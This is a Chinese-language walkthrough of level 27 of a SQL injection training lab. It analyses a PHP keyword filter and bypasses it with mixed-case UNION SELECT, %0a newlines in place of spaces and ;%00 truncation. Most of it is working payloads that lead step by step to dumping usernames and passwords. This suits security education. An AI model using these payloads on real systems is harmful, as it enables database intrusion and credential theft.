# Less-27 （SELECT/UNION 大小写绕过）

## 查看分析源码
```php
$id= preg_replace('/[\/\*]/',"", $id);      // strip /*
$id= preg_replace('/[--]/',"", $id);        // --
$id= preg_replace('/[#]/',"", $id);         // #
$id= preg_replace('/[ +]/',"", $id);        // 空格和+
$id= preg_replace('/select/m',"", $id);     // select（第一次）
$id= preg_replace('/[ +]/',"", $id);        // 又来一次
$id= preg_replace('/union/s',"", $id);      // union
$id= preg_replace('/select/s',"", $id);     // 又select（第二次）
$id= preg_replace('/UNION/s',"", $id);      // 大写UNION
$id= preg_replace('/SELECT/s',"", $id);     // 大写SELECT
$id= preg_replace('/Union/s',"", $id);      // 首字母Union
$id= preg_replace('/Select/s',"", $id);     // 首字母Select
```

过滤了三种大小写的 select（select/SELECT/Select）和 union（union/UNION/Union），没有 `/i` 标志，所以避开这三个写法就行——`sEleCt`、`uNiOn` 随便绕。

select 被过滤了两次（第 5 行和第 10 行），所以双写 `selsselectect` → 第一次删 select → 第二次又删 select → 没了。要双写的场合得用三写。

但更简单的是混合大小写——一次都不用双写。

空格只拦 `[ +]`，`%0a`（换行）随便用。注释 `--` `#` `/*` 全封了，参考 23 关用 `;%00` 截断。

## 确认注入点

```
?id=1'
```

闭合方式是 `'$id'`

## order by

```
?id=1'%0aorder%0aby%0a3;%00
?id=1'%0aorder%0aby%0a4;%00
```

4 报错 → 3 列

## 回显位

```
?id=0'%0aunIOn%0aSeleCT%0a1,2,3;%00
```

回显 2、3

## 爆库名

```
?id=0'%0aunIOn%0aSeleCT%0a1,database(),3;%00
```

## 爆表名

```
?id=0'%0aunIOn%0aSeleCT%0a1,group_concat(table_name),3%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database();%00
```

## 爆列名

```
?id=0'%0aunIOn%0aSeleCT%0a1,group_concat(column_name),3%0afrom%0ainformation_schema.columns%0awhere%0atable_schema=database()%0aand%0atable_name='users';%00
```

## 爆数据

```
?id=0'%0aunIOn%0aSeleCT%0a1,(selECt%0agroup_concat(username,':',password)%0afrom%0ausers),3;%00
```
![](99_Attachments/图片/Less-27/file-20260615200015528.png)
`:` 分割比 `0x3a` 看着顺眼，效果一样。

总结：`;%00` 截断比 `and '1'='1` 闭合干净——不用考虑第二个 SELECT 里有没有 WHERE、会不会被 `and` 污染。大小写绕过一次就够了，不用双写。空格 `%0a` 简单直接。
